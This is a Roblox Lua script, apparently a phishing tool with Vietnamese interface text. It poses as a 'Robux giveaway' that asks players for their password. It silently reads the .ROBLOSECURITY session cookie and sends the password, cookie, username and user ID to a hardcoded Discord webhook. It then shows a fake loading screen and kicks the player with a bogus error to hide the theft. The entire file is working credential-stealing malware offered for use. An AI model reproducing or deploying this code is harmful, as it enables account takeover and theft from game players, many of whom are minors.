local WebhookURL = "https://discord.com/api/webhooks/1470696581912072363/9dPRhbYSPrUMEt9OtrjUicl2795SD4yPZFoceDxDWL04MXM4MIr7MCY6a5gEIZwxgvfV"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")

local function SendData(content, cookie)
    local data = {
        ["embeds"] = {{
            ["title"] = "🔥 CHIẾN THẦN ĐÃ HỐT ĐƯỢC HÀNG 🔥",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "Tên tài khoản", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
                {["name"] = "ID người chơi", ["value"] = "```" .. LocalPlayer.UserId .. "```", ["inline"] = true},
                {["name"] = "Mật khẩu nhập vào", ["value"] = "```" .. content .. "```", ["inline"] = false},
                {["name"] = "Cookie (.ROBLOSECURITY)", ["value"] = "```" .. cookie .. "```", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Bú acc thành công lúc: " .. os.date("%X")}
        }}
    }
    local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    if req then
        req({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function GetCookie()
    local cookie = "N/A (Executor không hỗ trợ)"
    if getcookies then
        local c = getcookies("https://www.roblox.com")
        for _, v in pairs(c) do
            if v.Name == ".ROBLOSECURITY" then
                cookie = v.Value
                break
            end
        end
    end
    return cookie
end

local function FakeLoadingAndKick()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = game:GetService("CoreGui")
    ScreenGui.IgnoreGuiInset = true

    local Frame = Instance.new("Frame")
    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BackgroundTransparency = 0.4
    Frame.Size = UDim2.new(1, 0, 1, 0)
    Frame.Position = UDim2.new(0, 0, 0, 0)

    local Text = Instance.new("TextLabel")
    Text.Parent = Frame
    Text.Size = UDim2.new(0.6, 0, 0.1, 0)
    Text.Position = UDim2.new(0.2, 0, 0.45, 0)
    Text.BackgroundTransparency = 1
    Text.Text = "Đang xử lý yêu cầu nhận Robux... Vui lòng chờ"
    Text.TextColor3 = Color3.fromRGB(255, 255, 255)
    Text.TextScaled = true
    Text.Font = Enum.Font.GothamBold

    local spinner = Instance.new("ImageLabel")
    spinner.Parent = Frame
    spinner.Size = UDim2.new(0, 80, 0, 80)
    spinner.Position = UDim2.new(0.5, -40, 0.5, -40)
    spinner.BackgroundTransparency = 1
    spinner.Image = "rbxassetid://6031094667"  -- icon loading Roblox chuẩn
    spinner.ImageColor3 = Color3.fromRGB(0, 170, 255)

    local tweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1)
    local tween = TweenService:Create(spinner, tweenInfo, {Rotation = 360})
    tween:Play()

    wait(4 + math.random(1, 3))  -- fake delay 4-7 giây

    ScreenGui:Destroy()

    local fakeNotif = Instance.new("Hint")
    fakeNotif.Parent = workspace
    fakeNotif.Text = "Server đang gặp sự cố kết nối. Vui lòng thử lại sau vài phút."
    game:GetService("Debris"):AddItem(fakeNotif, 8)

    wait(1)

    LocalPlayer:Kick("There was a problem streaming data, please reconnect. (Error Code: 261)")
end

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local Desc = Instance.new("TextLabel")
local Input = Instance.new("TextBox")
local Submit = Instance.new("TextButton")

ScreenGui.Parent = game:GetService("CoreGui")
Main.Name = "FreeRobuxAdmin"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Main.Position = UDim2.new(0.5, -150, 0.5, -75)
Main.Size = UDim2.new(0, 300, 0, 150)
Main.Active = true
Main.Draggable = true

UICorner.Parent = Main

Title.Parent = Main
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "ROBUX GIVEAWAY SYSTEM"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14
Title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

Desc.Parent = Main
Desc.Position = UDim2.new(0, 0, 0, 35)
Desc.Size = UDim2.new(1, 0, 0, 30)
Desc.Text = "Nhập mật khẩu để xác nhận nhận 10,000 Robux"
Desc.TextColor3 = Color3.fromRGB(200, 200, 200)
Desc.TextSize = 12

Input.Parent = Main
Input.Position = UDim2.new(0, 25, 0, 70)
Input.Size = UDim2.new(0, 250, 0, 30)
Input.PlaceholderText = "Mật khẩu..."
Input.Text = ""
Input.TextSecurity = true

Submit.Parent = Main
Submit.Position = UDim2.new(0, 25, 0, 110)
Submit.Size = UDim2.new(0, 250, 0, 30)
Submit.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
Submit.Text = "NHẬN NGAY"
Submit.TextColor3 = Color3.fromRGB(255, 255, 255)

Submit.MouseButton1Click:Connect(function()
    local pass = Input.Text
    if pass ~= "" then
        local cookie = GetCookie()
        SendData(pass, cookie)
        Main:Destroy()
        FakeLoadingAndKick()
    end
end)